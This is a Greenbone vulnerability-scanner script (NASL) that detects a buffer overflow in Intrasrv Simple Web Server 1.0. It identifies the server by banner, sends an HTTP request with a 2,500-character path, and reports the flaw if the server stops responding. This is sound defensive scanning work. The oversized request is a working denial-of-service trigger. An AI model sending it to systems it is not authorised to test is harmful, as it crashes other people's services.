# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902973");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-05-31 11:32:38 +0530 (Fri, 31 May 2013)");

  script_name("Intrasrv Simple Web Server RCE and Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://en.securitylab.ru/poc/440852.php");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25836");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/intrasrv-simple-web-server-10-code-execution");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("intrasrv/banner");

  script_tag(name:"impact", value:"Successful exploitation will let remote unauthenticated attackers
  to cause a denial of service or execute arbitrary code.");

  script_tag(name:"affected", value:"Intrasrv Simple Web Server version 1.0");

  script_tag(name:"insight", value:"The flaw is due to an error when handling certain Long requests,
  which can be exploited to cause a denial of service or remote code execution.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Intrasrv Simple Web Server is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);

if("Server: intrasrv" >!< banner){
  exit(0);
}

req = http_get(item:crap(data:"A", length:2500), port:port);
res = http_send_recv(port:port, data:req);

req = http_get(item:"/",  port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(!res && http_is_dead(port:port))
{
  security_message(port:port);
  exit(0);
}

exit(99);
